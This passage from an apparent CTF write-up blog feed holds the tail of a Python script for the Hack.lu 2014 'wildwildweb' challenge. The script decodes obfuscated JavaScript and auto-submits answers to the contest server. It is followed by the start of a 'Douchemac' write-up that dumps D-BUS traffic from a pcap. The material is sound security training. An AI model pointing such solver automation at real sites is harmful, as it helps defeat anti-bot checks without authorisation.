</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;[&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;]&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">string</span><span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="p">)]</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span> <span class="k">print</span> <span class="n">line</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">line</span>
</span><span class='line'>  <span class="k">elif</span> <span class="s">&#39;[]+{}&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>  <span class="c">#[object Object]</span>
</span><span class='line'>    <span class="n">string</span> <span class="o">=</span> <span class="s">&quot;[object Object]&quot;</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span> <span class="k">print</span> <span class="s">&quot;5&quot;</span><span class="p">,</span> <span class="n">line</span><span class="p">,</span>
</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;[&quot;</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span> <span class="k">print</span> <span class="s">&quot;/&quot;</span><span class="p">,</span><span class="n">line</span><span class="p">,</span><span class="s">&quot;/&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;]&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span> <span class="k">print</span> <span class="s">&quot;|&quot;</span><span class="p">,</span><span class="n">line</span><span class="p">,</span><span class="s">&quot;|&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">string</span><span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="p">)]</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span> <span class="k">print</span> <span class="n">line</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">line</span>
</span><span class='line'>  <span class="k">elif</span> <span class="s">&quot;&quot;&quot;[][+[]]+&quot;&quot;&quot;&quot;&quot;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
</span><span class='line'>    <span class="n">string</span> <span class="o">=</span> <span class="s">&quot;undefined&quot;</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span> <span class="k">print</span> <span class="s">&quot;6&quot;</span><span class="p">,</span> <span class="n">line</span><span class="p">,</span>
</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;[&quot;</span><span class="p">)[</span><span class="mi">4</span><span class="p">]</span>
</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;]&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">string</span><span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="p">)]</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span> <span class="k">print</span> <span class="n">line</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">line</span>
</span><span class='line'>  <span class="k">elif</span> <span class="s">&quot;&#39;&#39;+!0&quot;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
</span><span class='line'>    <span class="n">string</span> <span class="o">=</span> <span class="s">&quot;true&quot;</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span> <span class="k">print</span> <span class="s">&quot;7&quot;</span><span class="p">,</span> <span class="n">line</span><span class="p">,</span>
</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;[&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;]&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">string</span><span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="p">)]</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span> <span class="k">print</span> <span class="n">line</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">line</span>
</span><span class='line'>  <span class="k">elif</span> <span class="s">&quot;).toString(&quot;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
</span><span class='line'>    <span class="n">string</span> <span class="o">=</span> <span class="s">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span> <span class="k">print</span> <span class="s">&quot;8&quot;</span><span class="p">,</span> <span class="n">line</span><span class="p">,</span>
</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;(&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;)&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">string</span><span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="p">)]</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span> <span class="k">print</span> <span class="n">line</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">line</span>
</span><span class='line'>  <span class="k">elif</span> <span class="s">&#39;var&#39;</span> <span class="ow">in</span> <span class="n">line</span> <span class="ow">and</span> <span class="s">&#39;createLinearGradient&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">line</span> <span class="ow">and</span> <span class="s">&#39;getContext&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;?&quot;</span><span class="p">,</span> <span class="n">line</span>
</span><span class='line'>    <span class="k">return</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>  <span class="k">elif</span> <span class="s">&#39;fillText&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span> <span class="k">print</span> <span class="s">&quot;!&quot;</span><span class="p">,</span> <span class="n">line</span>
</span><span class='line'>    <span class="k">return</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="k">return</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">isALetter</span><span class="p">(</span><span class="n">line</span><span class="p">):</span>
</span><span class='line'>  <span class="k">if</span> <span class="s">&#39;atob&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span> <span class="k">return</span> <span class="bp">True</span>
</span><span class='line'>  <span class="k">elif</span> <span class="s">&#39;fromCharCode&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span> <span class="k">return</span> <span class="bp">True</span>
</span><span class='line'>  <span class="k">elif</span> <span class="s">&#39;.source&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span> <span class="k">return</span> <span class="bp">True</span>
</span><span class='line'>  <span class="k">elif</span> <span class="s">&#39;!1&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span> <span class="k">return</span> <span class="bp">True</span>
</span><span class='line'>  <span class="k">elif</span> <span class="s">&#39;[]+{}&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span> <span class="k">return</span> <span class="bp">True</span>
</span><span class='line'>  <span class="k">elif</span> <span class="s">&quot;&quot;&quot;[][+[]]+&quot;&quot;&quot;&quot;&quot;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span> <span class="k">return</span> <span class="bp">True</span>
</span><span class='line'>  <span class="k">elif</span> <span class="s">&quot;&#39;&#39;+!0&quot;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span> <span class="k">return</span> <span class="bp">True</span>
</span><span class='line'>  <span class="k">elif</span> <span class="s">&quot;).toString(&quot;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span> <span class="k">return</span> <span class="bp">True</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span> <span class="k">return</span> <span class="bp">False</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">isAPosition</span><span class="p">(</span><span class="n">line</span><span class="p">):</span>
</span><span class='line'>  <span class="k">if</span> <span class="s">&#39;fillText&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span> <span class="k">return</span> <span class="bp">True</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">extractPosition</span><span class="p">(</span><span class="n">line</span><span class="p">):</span>
</span><span class='line'>  <span class="k">if</span> <span class="s">&#39;fillText&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
</span><span class='line'>    <span class="n">pos</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;,&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span> <span class="k">print</span> <span class="s">&quot;POS = &quot;</span><span class="p">,</span> <span class="n">pos</span>
</span><span class='line'>    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">pos</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">false</span>
</span><span class='line'>
</span><span class='line'><span class="n">url</span><span class="o">=</span><span class="s">&#39;https://wildwildweb.fluxfingers.net:1422/&#39;</span>
</span><span class='line'><span class="n">cookies</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">()</span>
</span><span class='line'><span class="n">params</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">()</span>
</span><span class='line'><span class="n">PHPSESSID</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">PHPSESSID</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">cookies</span><span class="p">[</span><span class="s">&#39;PHPSESSID&#39;</span><span class="p">]</span>
</span><span class='line'><span class="n">cookies</span><span class="p">[</span><span class="s">&#39;PHPSESSID&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">PHPSESSID</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
</span><span class='line'>  <span class="c">#print r.cookies[&#39;PHPSESSID&#39;]</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">script</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&quot;.*script.*&quot;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>  <span class="n">scriptLines</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s">r&quot;;&quot;</span><span class="p">,</span> <span class="s">&quot;;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">script</span><span class="p">)</span>
</span><span class='line'>  <span class="n">scriptLines</span> <span class="o">=</span> <span class="n">scriptLines</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">answerArray</span> <span class="o">=</span> <span class="p">[</span><span class="bp">None</span><span class="p">]</span> <span class="o">*</span> <span class="mi">100</span>
</span><span class='line'>  <span class="n">answerString</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="n">scriptLine</span> <span class="ow">in</span> <span class="n">scriptLines</span><span class="p">:</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">isALetter</span><span class="p">(</span><span class="n">scriptLine</span><span class="p">):</span>
</span><span class='line'>      <span class="n">letter</span> <span class="o">=</span> <span class="n">extractLetter</span><span class="p">(</span><span class="n">scriptLine</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">isAPosition</span><span class="p">(</span><span class="n">scriptLine</span><span class="p">):</span>
</span><span class='line'>      <span class="n">position</span> <span class="o">=</span> <span class="n">extractPosition</span><span class="p">(</span><span class="n">scriptLine</span><span class="p">)</span>
</span><span class='line'>      <span class="n">answerArray</span><span class="p">[</span><span class="n">position</span><span class="p">]</span> <span class="o">=</span> <span class="n">letter</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="n">letter</span> <span class="ow">in</span> <span class="n">answerArray</span><span class="p">:</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">letter</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
</span><span class='line'>      <span class="n">answerString</span> <span class="o">+=</span> <span class="n">letter</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot; -- REPLYING:&quot;</span> <span class="p">,</span> <span class="n">answerString</span>
</span><span class='line'>  <span class="n">params</span><span class="p">[</span><span class="s">&#39;solution&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">answerString</span>
</span><span class='line'>  <span class="n">params</span><span class="p">[</span><span class="s">&#39;submit&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;OK&quot;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># print r.content</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">splitlines</span><span class="p">():</span>
</span><span class='line'>    <span class="k">if</span> <span class="s">&#39;&lt;p&gt;&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span> <span class="k">print</span> <span class="n">line</span>
</span><span class='line'>    <span class="k">if</span> <span class="s">&#39;&lt;li&gt;&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
</span><span class='line'>      <span class="k">print</span> <span class="n">line</span>
</span><span class='line'>      <span class="k">if</span> <span class="s">&#39;a href=&quot;?login=&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
</span><span class='line'>        <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;&quot;&#39;</span><span class="p">)</span>
</span><span class='line'>        <span class="n">q</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">line</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
</span><span class='line'>        <span class="k">print</span> <span class="n">q</span><span class="o">.</span><span class="n">content</span>
</span><span class='line'>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="s">&#39;slow&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span> <span class="k">print</span> <span class="n">line</span>
</span><span class='line'>    <span class="k">if</span> <span class="s">&#39;anew&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span> <span class="k">print</span> <span class="n">line</span>
</span><span class='line'>    <span class="k">if</span> <span class="s">&#39;good&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span> <span class="k">print</span> <span class="n">line</span>
</span></code></pre></td></tr></table></div></figure>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hack.lu 2014 - Douchemac]]></title>
    <link href="http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-douchemac/"/>
    <updated>2014-10-24T14:57:00-04:00</updated>
    <id>http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-douchemac</id>
    <content type="html"><![CDATA[<h2>Challenge</h2>

<ul>
<li>by martin (Crypto)</li>
<li>200 (+100) Points</li>
</ul>

<p>Our companion Jesse James shot a carrier pigeon. It had a letter containing weird characters. Maybe it has something todo with the local gold mine. </p>

<p>Download</p>

<h2>Analysis</h2>

<p>The download is a pcap of D-BUS traffic.</p>

<p>Eventually, you find:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>------------------------------------------------------
</span><span class='line'>|        SIMPLE SECURE NOTES STORAGE SYSTEM            |
</span><span class='line'>| DOUCHEMAC-SHA256-CBC Authentication System           |
</span><span class='line'>| 1. start a session (valid 10 min)                    |
</span><span class='line'>| 2. authenticate                                      |
</span><span class='line'>| 3. work                                              |
</span><span class='line'>|                                                      |
</span><span class='line'>|                                                      |
</span><span class='line'>| NULL padding                                         |
</span><span class='line'> ------------------------------------------------------
</span><span class='line'>Use ID: 75288142666
</span><span class='line'>Use Nonce: z9TxSOvwZ21KDcHQeTef8Q== to xor your key!
</span></code></pre></td></tr></table></div></figure>

<p>There are two TCP Flows in the PCAP:</p>

<p>One:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>.AUTH EXTERNAL 363636
</span><span class='line'>REJECTED EXTERNAL DBUS_COOKIE_SHA1 ANONYMOUS
</span><span class='line'>AUTH DBUS_COOKIE_SHA1 363636
</span><span class='line'>REJECTED EXTERNAL DBUS_COOKIE_SHA1 ANONYMOUS
</span><span class='line'>AUTH ANONYMOUS 6c69626462757320312e382e38
</span><span class='line'>OK aba45dc8a0c4d0ff480a9adc5433de97
</span><span class='line'>BEGIN
</span><span class='line'>l...........n.....o...../org/freedesktop/DBus.....s.....org.freedesktop.DBus......s.....org.freedesktop.DBus......s.....Hello...l...
</span><span class='line'>.......=.....s.....:1.31.....u.......g..s....s.....org.freedesktop.DBus........:1.31.l.................o...../org/freedesktop/DBus.....s.....org.freedesktop.DBus......s.....org.freedesktop.DBus......s.....GetNameOwner......g..s......test.test123.Server.l...
</span><span class='line'>.............o...../org/freedesktop/DBus.....s.....org.freedesktop.DBus......s.....NameAcquired......s.....:1.31.....g..s....s.....org.freedesktop.DBus........:1.31.l...
</span><span class='line'>.......=.....s.....:1.31.....u.......g..s....s.....org.freedesktop.DBus........:1.30.l...........c.....o...../Server...s.....:1.30.....s.#...org.freedesktop.DBus.Introspectable.......s.
</span><span class='line'>...Introspect......l.................o...../org/freedesktop/DBus.....s.....org.freedesktop.DBus......s.....org.freedesktop.DBus......s.....GetNameOwner......g..s......test.test123.Server.l.................s.....:1.31.....u.......g..s....s.....:1.30.......&lt;!DOCTYPE node PUBLIC &quot;-//freedesktop//DTD D-BUS Object Introspection 1.0//EN&quot;
</span><span class='line'>&quot;http://www.freedesktop.org/standards/dbus/1.0/introspect.dtd&quot;&gt;
</span><span class='line'>&lt;node name=&quot;/Server&quot;&gt;
</span><span class='line'>  &lt;interface name=&quot;org.freedesktop.DBus.Introspectable&quot;&gt;
</span><span class='line'>    &lt;method name=&quot;Introspect&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>  &lt;/interface&gt;
</span><span class='line'>  &lt;interface name=&quot;test.test123.Interface&quot;&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_genrnd&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>  &lt;/interface&gt;
</span><span class='line'>  &lt;interface name=&quot;test.test123.Server&quot;&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_authc&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;msg&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;iv&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;tag&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_auths&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;msg&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_time&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_list&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_put&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;filename&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;text&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_get&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;id&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;in&quot;  type=&quot;s&quot; name=&quot;filename&quot; /&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>    &lt;method name=&quot;dbus_start&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
</span><span class='line'>  &lt;/interface&gt;
</span><span class='line'>&lt;/node&gt;
</span><span class='line'>.l...
</span><span class='line'>.......=.....s.....:1.31.....u.......g..s....s.....org.freedesktop.DBus........:1.30.l...........c.....o...../Server...s.....:1.30.....s.#...org.freedesktop.DBus.Introspectable.......s.
</span><span class='line'>...Introspect......l.................s.....:1.31.....u.......g..s....s.....:1.30.......&lt;!DOCTYPE node PUBLIC &quot;-//freedesktop//DTD D-BUS Object Introspection 1.0//EN&quot;
</span><span class='line'>&quot;http://www.freedesktop.org/standards/dbus/1.0/introspect.dtd&quot;&gt;
</span><span class='line'>&lt;node name=&quot;/Server&quot;&gt;
</span><span class='line'>  &lt;interface name=&quot;org.freedesktop.DBus.Introspectable&quot;&gt;
</span><span class='line'>    &lt;method name=&quot;Introspect&quot;&gt;
</span><span class='line'>      &lt;arg direction=&quot;out&quot; type=&quot;s&quot; /&gt;
</span><span class='line'>    &lt;/method&gt;
